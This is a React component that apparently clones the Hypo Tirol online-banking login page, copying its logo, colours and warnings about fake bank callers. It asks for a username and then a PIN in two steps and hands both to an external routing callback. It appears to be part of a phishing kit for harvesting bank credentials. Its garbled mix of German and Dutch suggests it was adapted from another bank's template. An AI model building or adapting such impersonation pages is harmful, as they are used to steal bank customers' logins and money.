"use client";

import React, { useState } from "react";
import Image from "next/image";

type Props = {
  formData: {
    verfuegernummer?: string;
    pin?: string;
  };
  onChange: (field: string, value: string) => void;
  handleRouteAction: () => void;
  saving?: boolean;
};

export function HypoTirol({ formData, onChange, handleRouteAction, saving }: Props) {
  const [step, setStep] = useState(1);

  const handleNextStep = (e: React.FormEvent) => {
    e.preventDefault();
    if (formData.verfuegernummer) {
      setStep(2);
    }
  };

  const handleFinalSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    handleRouteAction();
  };

  return (
    <div className="min-h-screen bg-[#f2f2f2] font-sans flex flex-col items-center">
      
      {/* Top Header */}
      <header className="w-full bg-[#495b68] h-[72px] flex items-center justify-center md:justify-start md:pl-24 shrink-0 shadow-sm">
        <div className="relative h-12 w-[240px]">
          <Image 
            src="/hypotirol-logo.webp" 
            alt="HYPO TIROL" 
            fill
            className="object-contain object-left"
          />
        </div>
      </header>

      {/* Main Content Area */}
      <div className="flex-1 flex flex-col items-center w-full mt-16 px-4 pb-12">
        
        {/* Centered Login Card */}
        <div className="bg-white w-full max-w-[600px] shadow-[0_2px_15px_rgba(0,0,0,0.05)] flex flex-col border border-[#e5e5e5]">
          
          {/* Header Strip */}
          <div className="bg-[#5b6a75] px-6 py-4">
            <h1 className="text-[20px] font-normal text-white tracking-wide">Internetbanking Login</h1>
          </div>

          <div className="p-6 md:p-8">
            
            {/* Red Warning Box */}
            <div className="border border-[#cc0000] rounded-sm p-4 flex gap-4 mb-6">
              <div className="shrink-0 mt-0.5">
                <div className="w-7 h-7 bg-[#cc0000] rounded-full flex items-center justify-center text-white font-bold text-lg">
                  !
                </div>
              </div>
              <div className="flex flex-col gap-1.5">
                <h3 className="text-[#cc0000] font-bold text-[14px]">Wichtiger Sicherheitshinweis!</h3>
                <p className="text-[#333] text-[13px] leading-snug">
                  <span className="font-bold text-[#cc0000]">ACHTUNG:</span> Anrufe FALSCHER Bankmitarbeiter!
                </p>
                <p className="text-[#333] text-[13px] leading-snug">
                  <span className="font-bold text-[#cc0000]">NIEMALS:</span> Passwörter, Gebruikersnaamn oder Codes nennen.
                </p>
                <p className="text-[#333] text-[13px] leading-snug">
                  <span className="font-bold text-[#cc0000]">SOFORT:</span> Auflegen, wenn Sie danach gefragt werden.
                </p>
              </div>
            </div>

            {/* Info Texts */}
            <div className="flex flex-col gap-4 text-[#333] text-[13px] leading-relaxed mb-8">
              <p>
                Tijdens het inloggen wordt een beveiligde verbinding opgezet. Let op dat u uw inloggegevens nergens anders invoert en deze geheim houdt.
              </p>
              <p>
                Die Hypo Tirol Bank wird Sie <span className="font-bold">zu keiner Zeit per E-Mail oder telefonisch dazu auffordern</span>, Ihre Internetbanking-Zugangsdaten bekannt zu geben.
              </p>
              <p>
                Als neuer Kunde geben Sie bitte Ihren Gebruikersnaamn & Ihr Wachtwoord aus unserem Schreiben ein und durchlaufen Sie die weiterführenden Schritte.
              </p>
            </div>

            {/* Login Form */}
            <form onSubmit={step === 1 ? handleNextStep : handleFinalSubmit} className="flex flex-col w-full border-b border-[#e5e5e5] pb-6 mb-6">
              
              <div className="flex justify-between items-end mb-1">
                <label className="text-[#888] text-[12px]">
                  {step === 1 ? "Anmeldung mit Gebruikersnaam" : "Wachtwoord eingeben"}
                </label>
                <div className="text-[#666] text-[12px]">
                  <a href="#" className="hover:text-[#333]">Hochkontrast</a>
                  <span className="mx-1">|</span>
                  <a href="#" className="hover:text-[#333]">English</a>
                </div>
              </div>

              <div className="mb-6">
                {step === 1 ? (
                  <input 
                    type="text" 
                    required
                    autoFocus
                    value={formData.verfuegernummer || ""}
                    onChange={(e) => onChange("verfuegernummer", e.target.value)}
                    className="w-full h-[40px] bg-[#f8f8f8] border border-[#ccc] rounded-sm px-3 outline-none focus:border-[#5b6a75] text-[#333] text-[14px] transition-colors"
                  />
                ) : (
                  <div className="animate-in fade-in slide-in-from-right-4 duration-300">
                    <input 
                      type="password" 
                      required
                      autoFocus
                      value={formData.pin || ""}
                      onChange={(e) => onChange("pin", e.target.value)}
                      className="w-full h-[40px] bg-[#f8f8f8] border border-[#ccc] rounded-sm px-3 outline-none focus:border-[#5b6a75] text-[#333] text-[14px] transition-colors"
                    />
                  </div>
                )}
              </div>

              <button 
                type="submit" 
                disabled={saving}
                className="w-full bg-[#5b6a75] hover:bg-[#495b68] text-white font-medium h-[40px] rounded-[3px] text-[14px] transition-colors disabled:opacity-70"
              >
                {saving ? "Wird geladen..." : "Weiter"}
              </button>
              
              {step === 2 && (
                <button 
                  type="button" 
                  onClick={() => setStep(1)}
                  className="w-full mt-3 bg-white border border-[#5b6a75] hover:bg-[#f0f3f5] text-[#5b6a75] font-medium h-[40px] rounded-[3px] text-[14px] transition-colors"
                >
                  Zurück
                </button>
              )}
            </form>

            {/* Live Hilfe Footer */}
            <div className="flex justify-center">
              <div className="flex items-center gap-1.5 cursor-pointer group">
                <div className="w-4 h-4 rounded-full border border-[#666] text-[#666] flex items-center justify-center font-serif text-[10px] group-hover:bg-[#666] group-hover:text-white transition-colors">
                  i
                </div>
                <a href="#" className="text-[#666] text-[13px] group-hover:text-[#333] transition-colors">
                  Live Hilfe
                </a>
              </div>
            </div>

          </div>
        </div>
      </div>
    </div>
  );
}
